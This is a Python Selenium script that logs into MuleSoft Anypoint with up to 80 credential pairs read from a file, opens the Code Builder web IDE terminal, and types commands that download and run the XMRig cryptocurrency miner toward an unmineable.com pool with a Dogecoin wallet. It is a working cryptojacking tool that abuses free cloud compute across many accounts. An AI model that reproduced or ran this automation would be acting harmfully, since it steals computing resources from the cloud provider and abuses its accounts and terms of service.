from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from urllib.parse import urlparse, parse_qs, unquote
import time
import threading
import os
chrome_driver_path = "/usr/local/bin/chromedriver"
login_url = "https://anypoint.mulesoft.com/login/"
with open("acc.txt", "r") as file:
    accounts = [line.strip().split(":") for line in file.readlines()]

def open_browser(instance_number, email, password):
    options = webdriver.ChromeOptions() # Critical for Docker/Linux
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-backgrounding-occluded-windows")
    options.add_argument("--disable-client-side-phishing-detection")
    options.add_argument("--enable-logging")
    options.add_argument("--log-level=3")
    options.add_experimental_option("useAutomationExtension", False)
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-background-networking")
    options.add_argument("--headless")
    options.add_argument("--disable-extensions")
    options.add_argument("--blink-settings=imagesEnabled=false")
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-sync")
    options.add_argument("--disable-translate")
    options.add_argument("--disable-background-timer-throttling")
    options.add_argument("--disable-renderer-backgrounding")
    options.add_argument("--mute-audio")
    options.add_argument("--no-first-run")
    options.add_argument("--disable-notifications")
    options.add_argument("--disable-software-rasterizer")
    options.add_argument("--window-size=800,600")
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    options.add_experimental_option("detach", True)
    driver = webdriver.Chrome(service=Service(chrome_driver_path), options=options)

    driver.get(login_url)
    print(f"[{email}] OPEN CHROME")
    wait = WebDriverWait(driver, 30)

    try:
        username_field = wait.until(EC.presence_of_element_located((By.ID, "nameInput")))
        password_field = driver.find_element(By.ID, "passwordInput")
        username_field.send_keys(email)
        password_field.send_keys(password)
        password_field.send_keys(Keys.RETURN)
        print(f"[{email}] ✅ Login submitted.")
    except Exception as e:
        print(f"[{email}] ❌ Login fields not found: {e}")
    time.sleep(2)
    if "codebuilder" not in driver.current_url:
        driver.get("https://anypoint.mulesoft.com/codebuilder/")

    try:
        launch_button = wait.until(EC.element_to_be_clickable((By.ID, "launch-your-webide-btn-card")))
        launch_button.click()
        print(f"[{email}] ✅ Clicked Launch button")
    except:
        print(f"[{email}] ❌ Launch button not found")
        
    original_window = driver.current_window_handle

# Wait for new window/tab to open
    WebDriverWait(driver, 30).until(EC.number_of_windows_to_be(2))

# Switch to the new window
    for handle in driver.window_handles:
        if handle != original_window:
            driver.switch_to.window(handle)
            break  #
            
    print(f"[{email}] Switched to Code Builder window")
    time.sleep(60)
    
    if "redirect_uri" in driver.current_url:
        parsed_url = urlparse(driver.current_url)
        query_params = parse_qs(parsed_url.query)
        redirect_uri = query_params.get('redirect_uri', [''])[0]
        gg8 = unquote(redirect_uri)
        driver.get(gg8)
        time.sleep(30)
        print(f"[{email}] url {driver.current_url}")
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
    else:
        time.sleep(60)
        print(driver.current_url)
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
    try:
        textarea = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-screen")))
        textarea.click()
        print("✅ Command executed.")
    except:
        print(f"[{email}] ❌ area not found ")
        
    
    try:
        textarea1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-helper-textarea")))
        print("SUCCES")        
        textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o rx.unmineable.com:3333 -u DOGE:DDXHWnNzB5dyxjCe4xrsxJHDefwAWH1bhE.{email}#gvkv-lvzh -p -k --threads=4")
        textarea1.send_keys(Keys.ENTER)
    except:
        print(f"[{email}] ❌ terminal not found ")
        

# Launch multiple instances
threads = []
for i, (email, password) in enumerate(accounts[:80]):
    thread = threading.Thread(target=open_browser, args=(i, email, password))
    thread.start()
    threads.append(thread)
    time.sleep(35)  # Prevent overload

for thread in threads:
    thread.join()

print("✅ All Chrome instances launched and optimized.")
        
